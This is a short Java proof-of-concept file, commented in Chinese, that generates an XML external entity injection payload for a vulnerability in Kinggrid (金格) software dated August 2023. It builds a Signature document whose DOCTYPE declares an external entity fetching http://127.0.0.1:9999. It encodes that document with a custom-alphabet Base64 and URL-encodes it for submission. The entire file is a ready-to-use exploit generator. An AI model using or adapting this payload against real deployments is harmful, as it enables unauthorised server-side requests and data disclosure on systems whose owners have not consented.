package cve;

import utils.Base64Util;
import java.net.URLEncoder;

/**
 * 金格xml外部实体注入漏洞 202308
 * 该代码用于生成发送poc的xmlvalue
 */
public class test2 {

    public static void main(String[] args) throws Exception {

        String en = "<!DOCTYPE ANY[<!ENTITY root SYSTEM \"http://127.0.0.1:9999\">]><Signature><Field><value " +
                "Index=\"ProtectItem\">true</value><value Index=\"VALUE\">&root;</value></Field></Signature>";
        en = Base64Util.encode(en.getBytes(), "UTF-8",
                "ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=");

//        xmlValue 的内容：
        System.out.println(URLEncoder.encode(en));

    }
}
